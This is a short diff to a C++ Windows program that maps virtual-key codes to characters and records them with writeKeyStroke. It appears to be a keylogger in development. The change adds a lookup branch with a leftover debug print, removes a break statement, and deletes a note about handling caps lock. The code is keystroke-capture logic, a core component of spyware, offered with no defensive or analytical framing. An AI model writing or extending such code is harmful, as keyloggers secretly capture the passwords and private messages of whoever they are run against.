@@ -50,11 +50,15 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                     writeKeyStroke(findShiftPlusKey());
                     key = 0;
                 }
+                else if (vkMaps.searchMiscMaps(i) != 1) 
+                {
+                    std::cout << "truee";
+                    key = 0;
+                }
                 else if (vkMaps.searchAsciiMaps(i) != 1) 
                 {
                     writeKeyStroke(specialKey);
                     key = 0;
-                    break;
                 }
                 else 
                 {
@@ -69,8 +73,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
 
 /*
             Notes
-        ~ ensure that checks are made to check if VK_CAPITAL is being pressed and convert accordingly. (with regards to alphabetical characters)
-
+        
 
             To-do
         ~ develop naming convention for characters that don't translate to ascii values. 
